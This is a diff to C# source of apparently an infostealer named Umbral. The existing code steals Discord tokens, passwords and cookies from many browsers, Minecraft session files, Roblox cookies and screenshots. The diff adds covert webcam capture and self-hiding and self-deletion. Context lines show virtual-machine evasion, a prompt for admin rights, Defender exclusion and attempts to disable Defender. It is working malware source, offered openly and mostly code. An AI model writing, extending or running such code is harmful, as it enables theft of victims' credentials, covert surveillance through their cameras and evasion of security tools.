@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Drawing;
 using System.IO;
 using System.Threading;
 using System.Threading.Tasks;
@@ -11,7 +12,8 @@ using Umbral.payload.Games.Minecraft;
 using Umbral.payload.Games.Roblox;
 using Umbral.payload.Postman;
 using Umbral.payload.Utilities;
-using Umbral.payload.Vmprotect;
+using Umbral.payload.AntiVm;
+using Umbral.payload.Webcam;
 
 namespace Umbral.payload
 {
@@ -92,12 +94,16 @@ namespace Umbral.payload
                 getMinecraftFiles =
                     MinecraftStealer.StealMinecraftFiles(Path.Combine(tempFolder, "Games", "Minecraft"));
 
+            var captureWebcam = Task.Run(() => new Dictionary<string, Bitmap>());
+            if (Settings.CaptureWebcam)
+                captureWebcam = ImageCapture.CaptureWebcam();
+
             await Task.WhenAll(getTokens, getBravePasswords, getChromePasswords, getChromiumPasswords, getComodoPasswords,
                     getEdgePasswords, getEpicPrivacyPasswords, getIridiumPasswords, getOperaPasswords, getOperaGxPasswords,
                     getSlimjetPasswords, getUrPasswords, getVivaldiPasswords, getYandexPasswords, getBraveCookies,
                     getChromeCookies, getChromiumCookies, getComodoCookies, getEdgeCookies, getEpicPrivacyCookies,
                     getIridiumCookies, getOperaCookies, getOperaGxCookies, getSlimjetCookies, getUrCookies,
-                    getVivaldiCookies, getYandexCookies, getMinecraftFiles, getRobloxCookies);
+                    getVivaldiCookies, getYandexCookies, getMinecraftFiles, getRobloxCookies, captureWebcam);
 
             var discordAccounts = await getTokens;
 
@@ -135,12 +141,15 @@ namespace Umbral.payload
 
             var screenshots = Common.CaptureScreenShot();
 
+            var webcamImages = await captureWebcam;
+
             var saveProcesses = new List<Task>();
             var cookiesCount = 0;
             var passwordsCount = 0;
             var discordTokenCount = 0;
             var robloxCookieCount = 0;
             var screenshotCount = 0;
+            var webcamImagesCount = 0;
 
             if (discordAccounts.Length > 0 && Settings.StealDiscordtokens)
             {
@@ -156,6 +165,14 @@ namespace Umbral.payload
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(Task.Run(() => SaveData.SaveToFile(screenshots, saveTo)));
                 screenshotCount += screenshots.Length;
+            }
+
+            if (webcamImages.Count > 0 && Settings.CaptureWebcam)
+            {
+                var saveTo = Path.Combine(tempFolder, "Webcam");
+                Directory.CreateDirectory(saveTo);
+                saveProcesses.Add(Task.Run(() => SaveData.SaveToFile(webcamImages, saveTo)));
+                webcamImagesCount += webcamImages.Count;
             }
 
             #region StealPaswords
@@ -393,7 +410,8 @@ namespace Umbral.payload
                     { "Discord Tokens", discordTokenCount },
                     { "Minecraft Session Files", gotMinecraftFiles },
                     { "Roblox Cookies", robloxCookieCount },
-                    { "Screenshots", screenshotCount }
+                    { "Screenshots", screenshotCount },
+                    { "Webcam", webcamImagesCount }
                 });
                 File.Delete(archivePath);
             }
@@ -403,6 +421,8 @@ namespace Umbral.payload
             }
 
             Directory.Delete(tempFolder, true);
+            if (Settings.DeleteSelf && !Common.IsInStartup())
+                Syscalls.DeleteSelf();
         }
 
         private static async Task Process()
@@ -414,13 +434,16 @@ namespace Umbral.payload
             while (!await Common.IsConnectionAvailable())
                 Thread.Sleep(60000); // Connection available. Retry every 1 min.
 
-            if (Settings.VmProtect &&
+            if (Settings.AntiVm &&
                 Detector.IsVirtualMachine()) Environment.Exit(1); // Exit if virtual machine is detected.
 
             if (!Common.IsInStartup())
             {
                 Syscalls.AskForAdmin(); // Prompts user to give admin privileges
             }
+
+            if (Settings.DeleteSelf && !Common.IsInStartup())
+                Syscalls.HideSelf();
 
             Syscalls.DefenderExclude(Application.ExecutablePath); // Tries to add itself to Defender exclusions
             Syscalls.DisableDefender(); // Tries to disable defender. Fails if tamper protection is enabled.
